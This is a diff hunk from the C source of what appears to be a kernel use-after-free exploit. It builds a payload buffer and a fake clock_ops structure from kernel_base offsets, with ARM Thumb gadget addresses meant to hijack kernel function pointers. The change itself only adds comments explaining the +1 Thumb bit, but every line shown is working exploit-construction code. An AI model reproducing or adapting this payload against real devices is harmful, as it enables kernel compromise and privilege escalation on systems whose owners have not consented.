@@ -380,15 +380,15 @@ void *get_payload(void *ptr) {
     *(uint32_t *)uaf_payload_buffer = (uint32_t)clock_ops_overwrite;
     *(uint32_t *)(uaf_payload_buffer+0x4) = kernel_base + 0x4053cc;
     *(uint32_t *)(uaf_payload_buffer+0x8) = kernel_base + 0xc7754;
-    *(uint32_t *)(uaf_payload_buffer+0x10) = kernel_base + 0x319450 + 1;
+    *(uint32_t *)(uaf_payload_buffer+0x10) = kernel_base + 0x319450 + 1; //+1 to mark it as THUMB
     *(uint32_t *)(uaf_payload_buffer+0x14) = kernel_base + 0xd97d2;
-    *(uint32_t *)(uaf_payload_buffer+0x1C) = kernel_base + 0x31bc3c + 1;
+    *(uint32_t *)(uaf_payload_buffer+0x1C) = kernel_base + 0x31bc3c + 1; //+1 to mark it as THUMB
     *(uint32_t *)(uaf_payload_buffer+0x20) = kernel_base + 0xd97d2;
     *(uint32_t *)(uaf_payload_buffer+0x24) = kernel_base + 0xd97d2;
     
-    *(uint32_t *)clock_ops_overwrite = kernel_base + 0x319450 + 1;
-    *(uint32_t *)(clock_ops_overwrite+0xC) = kernel_base + 0x1db34 + 1;
-    *(uint32_t *)(clock_ops_overwrite+0x10) = kernel_base + 0xd97d0 + 1;
+    *(uint32_t *)clock_ops_overwrite = kernel_base + 0x319450 + 1; //+1 to mark it as THUMB
+    *(uint32_t *)(clock_ops_overwrite+0xC) = kernel_base + 0x1db34 + 1; //+1 to mark it as THUMB
+    *(uint32_t *)(clock_ops_overwrite+0x10) = kernel_base + 0xd97d0 + 1; //+1 to mark it as THUMB
     
     memcpy(pExploit+8, uaf_payload_buffer, sizeof(uaf_payload_buffer));
     memcpy(pExploit+8+sizeof(uaf_payload_buffer), clock_ops_overwrite, sizeof(clock_ops_overwrite));
